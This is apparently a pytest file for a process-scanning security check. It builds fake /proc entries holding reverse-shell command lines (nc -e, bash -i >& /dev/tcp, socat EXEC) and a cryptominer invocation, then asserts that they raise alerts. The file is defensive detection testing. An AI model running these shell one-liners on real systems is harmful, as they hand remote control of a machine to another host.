"""Check 4: the own running processes, read-only over a /proc root.

Every case except the last runs against a synthetic /proc tree under
tmp_path; the last one touches the real /proc and only asserts that
the own test process passes without a finding.
"""
from __future__ import annotations

import os
from pathlib import Path

from delfin.watchpost import checks
from delfin.watchpost.scan import collect


def _mk_proc(root: Path, pid: int, argv: list[str] | None = None,
             exe_target: str | None = None,
             empty_cmdline: bool = False) -> Path:
    d = root / str(pid)
    d.mkdir(parents=True)
    if empty_cmdline:
        (d / "cmdline").write_bytes(b"")
    elif argv is not None:
        (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv)
                                    + b"\0")
    if exe_target is not None:
        (d / "exe").symlink_to(exe_target)
    return d


def test_nc_exec_is_an_alert(tmp_path):
    _mk_proc(tmp_path, 101, argv=["nc", "-e", "/bin/bash",
                                  "10.0.0.1", "4444"])
    out = checks.check_processes(tmp_path)
    assert [(f.check, f.severity) for f in out] == [("processes", "alert")]
    assert out[0].path == "/proc/101"
    assert "nc-exec" in out[0].what


def test_dev_tcp_bash_i_redirect_is_an_alert(tmp_path):
    _mk_proc(tmp_path, 102,
             argv=["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"])
    out = checks.check_processes(tmp_path)
    assert [(f.check, f.severity) for f in out] == [("processes", "alert")]
    assert "dev-tcp" in out[0].what or "bash-i" in out[0].what


def test_socat_exec_is_an_alert(tmp_path):
    _mk_proc(tmp_path, 103,
             argv=["socat", "TCP-L:8080,reuseaddr",
                   "EXEC:/bin/bash", "-d", "-d"])
    out = checks.check_processes(tmp_path)
    assert [(f.severity, f.path) for f in out] == [("alert", "/proc/103")]


def test_deleted_exe_is_an_alert(tmp_path):
    _mk_proc(tmp_path, 104, argv=["python3", "helper.py"],
             exe_target="/home/u/proj/.venv/bin/python3 (deleted)")
    out = checks.check_processes(tmp_path)
    assert [(f.severity, f.what) for f in out] == [
        ("alert", "deleted-exe: /home/u/proj/.venv/bin/python3")]


def test_tmp_exe_is_a_warning(tmp_path):
    _mk_proc(tmp_path, 105, argv=["./helper"],
             exe_target="/tmp/helper")
    out = checks.check_processes(tmp_path)
    assert [(f.severity, f.what) for f in out] == [
        ("warn", "tmp-exe: /tmp/helper")]


def test_dev_shm_exe_is_a_warning(tmp_path):
    _mk_proc(tmp_path, 106, argv=["./helper"],
             exe_target="/dev/shm/helper")
    out = checks.check_processes(tmp_path)
    assert [(f.severity, f.what) for f in out] == [
        ("warn", "tmp-exe: /dev/shm/helper")]


def test_mining_markers_are_warnings(tmp_path):
    _mk_proc(tmp_path, 107, argv=["xmrig",
                                  "-o", "stratum+tcp://pool.example:3333",
                                  "--donate-level", "1"])
    out = checks.check_processes(tmp_path)
    whats = sorted(f.what for f in out)
    assert [f.severity for f in out] == ["warn", "warn", "warn"]
    assert whats == ["mining: --donate-level", "mining: stratum+tcp",
                     "mining: xmrig"]


def test_clean_process_yields_no_finding(tmp_path):
    _mk_proc(tmp_path, 108, argv=["/usr/bin/python3", "-m", "pytest"],
             exe_target="/usr/bin/python3")
    assert checks.check_processes(tmp_path) == []


def test_kernel_thread_like_entry_is_skipped(tmp_path):
    # kernel threads have an empty cmdline; nothing may be inferred
    _mk_proc(tmp_path, 2, empty_cmdline=True,
             exe_target="/usr/bin/python3 (deleted)")
    assert checks.check_processes(tmp_path) == []


def test_non_numeric_entries_and_missing_files_are_skipped(tmp_path):
    (tmp_path / "cpuinfo").write_text("processors\n")
    (tmp_path / "109").mkdir()  # neither cmdline nor exe
    assert checks.check_processes(tmp_path) == []


def test_processes_of_a_foreign_uid_are_skipped(tmp_path, monkeypatch):
    # /proc/<pid> is owned by the scanning user here; a scanner running
    # as a different UID (4242) must not look at these processes.
    _mk_proc(tmp_path, 110, argv=["nc", "-e", "/bin/sh", "1.2.3.4", "80"],
             exe_target="/tmp/evil")
    monkeypatch.setattr(checks, "_proc_scan_uid", lambda: 4242)
    assert checks.check_processes(tmp_path) == []


def test_collect_includes_the_process_check(tmp_path, monkeypatch):
    # A synthetic /proc root with a reverse shell in it must surface
    # through the ordinary scan path, not only through the check itself.
    proc = tmp_path / "proc"
    (proc / "201").mkdir(parents=True)
    (proc / "201" / "cmdline").write_bytes(
        b"nc\x00-e\x00/bin/bash\x009.9.9.9\x008444\x00")
    real = checks.check_processes
    monkeypatch.setattr(checks, "check_processes",
                        lambda root: real(proc))
    home = tmp_path / "home"
    (home / ".ssh").mkdir(mode=0o700, parents=True)
    (home / ".ssh" / "authorized_keys").write_text(
        "ssh-ed25519 AAAA me@host\n")
    (home / ".bashrc").write_text("export EDITOR=vim\n")
    findings = collect(home)
    # other checks may add their own info findings; the assertion is
    # that the process check's alert is in the collect output.
    assert [(f.check, f.severity, f.path) for f in findings
            if f.check == "processes"] == [
        ("processes", "alert", "/proc/201")]


def test_real_proc_leaves_own_test_process_without_finding():
    findings = checks.check_processes(Path("/proc"))
    own = f"/proc/{os.getpid()}"
    assert all(f.path != own for f in findings)


def test_a_proc_root_given_as_a_string_is_read_too(tmp_path):
    # The CLI and callers pass "/proc"; the first version divided a str.
    from delfin.watchpost import checks
    assert checks.check_processes(str(tmp_path)) == []


def test_text_about_a_reverse_shell_is_not_a_reverse_shell(tmp_path):
    # First live run (2026-09-25): a DELFIN agent whose task text, passed
    # as an argument, described /dev/tcp, nc -e and socat exec: raised
    # three alerts. The shapes are judged on the program now.
    from delfin.watchpost import checks
    _mk_proc(tmp_path, 301, ["/usr/bin/python3", "delfin-agent", "chat",
                             "look for /dev/tcp/, nc -e and socat EXEC: "
                             "in the user's processes"])
    assert checks.check_processes(tmp_path) == []


def test_a_shell_whose_script_only_mentions_dev_tcp_is_no_connection(tmp_path):
    from delfin.watchpost import checks
    _mk_proc(tmp_path, 302, ["/bin/bash", "-c",
                             "git commit -m 'judge /dev/tcp/ by host and port'"])
    _mk_proc(tmp_path, 303, ["/bin/bash", "-c",
                             "bash -i >& /dev/tcp/10.0.0.7/4444 0>&1"])
    assert [f.path for f in checks.check_processes(tmp_path)] == ["/proc/303"]
